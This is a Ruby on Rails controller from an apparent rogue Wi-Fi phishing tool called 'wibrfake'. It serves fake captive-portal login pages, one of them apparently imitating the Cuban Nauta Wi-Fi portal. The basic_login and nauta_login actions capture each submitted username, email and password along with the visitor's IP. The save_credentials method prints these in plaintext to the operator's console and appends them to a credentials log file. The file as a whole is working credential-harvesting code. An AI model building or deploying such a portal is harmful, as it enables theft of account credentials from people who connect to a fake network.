class SessionsController < ApplicationController
    def index
        render "index"
    end
  
    def page_basic
        render "basic"
    end
  
    def nauta
        respond_to do |format|
            format.html { render "nauta" }
            format.any do
                Rails.logger.info("Unsupported request format: #{request.headers['Accept']}")
                render "public/406-unsupported-browser", status: :not_acceptable
            end
            format.turbo_stream
        end
    end
  
    def basic_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password])
        render "basic"
    end
  
    def nauta_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password])
        render "nauta"
    end
  
    private
  
    def save_credentials(ip, username, email, password)
        puts """\n\r#{ip}{
        \n\r\tUser: #{username}
        \r\tEmail: #{email}
        \r\tPassword: #{password}
        \r}"""
        puts "\n"
        print "\r\033[38;5;236m\e[0m\033[48;5;236m \033[38;5;196mwibrfake  wlo1 \e[0m\033[38;5;236m\e[0m "
        File.open(File.join(File.dirname(__FILE__), '../../lib/wibrfake/Logs/credentials.log'), 'a') do |file|
            file.puts "#{Time.now} IP: #{ip}, Username: #{username}, Email: #{email}, Password: #{password}"
        end
    end
end